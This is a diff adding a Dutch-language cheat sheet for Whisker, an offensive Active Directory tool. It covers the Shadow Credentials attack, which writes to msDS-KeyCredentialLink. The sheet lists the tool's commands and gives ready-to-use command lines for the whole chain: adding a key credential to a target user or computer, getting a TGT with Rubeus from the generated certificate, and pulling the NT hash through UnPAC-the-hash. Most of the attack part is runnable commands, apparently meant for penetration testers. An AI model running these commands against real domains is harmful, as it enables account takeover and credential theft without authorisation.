@@ -1,0 +1,39 @@
+# Whisker — Shadow Credentials aanval (msDS-KeyCredentialLink)
+# Voeg shadow credentials toe aan AD objecten voor PKINIT authenticatie zonder wachtwoord
+#
+# === Syntax ===
+# Whisker.exe <commando> [opties]
+#
+# === Commando's ===
+# add      Voeg shadow credential toe aan doelobject
+# remove   Verwijder specifieke shadow credential
+# list     Toon shadow credentials van een object
+# clear    Verwijder alle shadow credentials van een object
+#
+# === Belangrijkste opties ===
+# /target:USER      Doelobject (gebruiker of computer)
+# /domain:DOMAIN    Doeldomein
+# /dc:DC            Domain Controller
+# /password:PASS    Wachtwoord voor gegenereerd certificaat
+# /path:PATH        Pad voor certificaat opslag
+#
+# === Aanvalsketen ===
+# 1. Schrijfrechten nodig op msDS-KeyCredentialLink van doel
+# 2. Whisker voegt key credential toe en genereert certificaat
+# 3. Gebruik certificaat met Rubeus voor TGT
+# 4. TGT bevat NT hash in PAC (UnPAC-the-hash)
+#
+# === Voorbeelden ===
+# -- Shadow credential toevoegen --
+Whisker.exe add /target:USER /domain:DOMAIN /dc:DC
+Whisker.exe add /target:TARGET$ /domain:DOMAIN /dc:DC /password:PASS /path:C:\temp\cert.pfx
+# -- Shadow credentials bekijken --
+Whisker.exe list /target:USER /domain:DOMAIN /dc:DC
+# -- Specifieke credential verwijderen --
+Whisker.exe remove /target:USER /deviceid:GUID /domain:DOMAIN /dc:DC
+# -- Alle credentials wissen --
+Whisker.exe clear /target:USER /domain:DOMAIN /dc:DC
+# -- Vervolg: TGT aanvragen met gegenereerd certificaat --
+# Rubeus.exe asktgt /user:USER /certificate:cert.pfx /password:PASS /domain:DOMAIN /dc:DC /nowrap
+# -- UnPAC-the-hash: NT hash uit TGT extraheren --
+# Rubeus.exe asktgt /user:USER /certificate:cert.pfx /password:PASS /getcredentials /nowrap
